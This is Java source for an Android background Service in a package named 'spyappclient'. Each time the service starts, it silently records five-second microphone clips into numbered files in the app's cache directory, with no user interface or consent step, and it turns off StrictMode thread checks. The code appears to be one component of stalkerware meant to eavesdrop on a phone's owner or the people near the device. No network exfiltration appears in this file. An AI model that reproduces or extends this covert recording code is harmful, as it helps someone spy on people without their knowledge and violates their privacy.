package com.example.alber.spyappclient;

import android.app.Service;
import android.content.Intent;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.os.StrictMode;
import android.support.annotation.Nullable;
import android.util.Log;

import java.io.IOException;
import java.util.concurrent.atomic.AtomicInteger;

public class RecordAudio extends Service{
    private static final String LOG = "RecordAudio";
    private static String myFileName = null;
    private int counter;
    private AtomicInteger atomicInteger;

    private MediaRecorder mediaRecorder = null;
    private MediaPlayer mediaPlayer = null;

    @Override
    public void onCreate() {
        super.onCreate();
        atomicInteger = new AtomicInteger(0);
        myFileName = getExternalCacheDir().getAbsolutePath();
        System.out.println("ON CREATE");
        Log.v(LOG, "OnCreate()");
        myFileName += "/test.3gp";
        StrictMode.ThreadPolicy policy =
                new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
    }

    @Override
    public void onStart(Intent intent, int startId) {
        synchronized (this) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        counter = atomicInteger.getAndIncrement();
                        myFileName = getExternalCacheDir().getAbsolutePath();
                        myFileName += "/" + counter + "test.3gp";
                        startRecording();
                        Thread.sleep(5000);
                        stopRecording();
                        Thread.sleep(5000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }

    private void onRecord(boolean start) {
        if (start) {
            startRecording();
        } else stopRecording();
    }

    private void onPlay(boolean start) {
        if (start) {
            startPlaying();
        } else stopPlaying();
    }

    private void startRecording() {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mediaRecorder.setOutputFile(myFileName);

        try {
            mediaRecorder.prepare();
        } catch (IOException e) {
            Log.v(LOG, "startRecording().prepare() failed!");
            e.printStackTrace();
        }
        mediaRecorder.start();
    }

    private void stopRecording() {
        mediaRecorder.stop();
        mediaRecorder.release();
        mediaRecorder = null;
    }

    private void startPlaying() {
        mediaPlayer = new MediaPlayer();
        try {
            mediaPlayer.setDataSource(myFileName);
            mediaPlayer.prepare();
        } catch (IOException e) {
            Log.v(LOG, "startPlaying().prepare()");
            e.printStackTrace();
        }
        mediaPlayer.start();
    }

    private void stopPlaying() {
        mediaPlayer.release();
        mediaPlayer = null;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
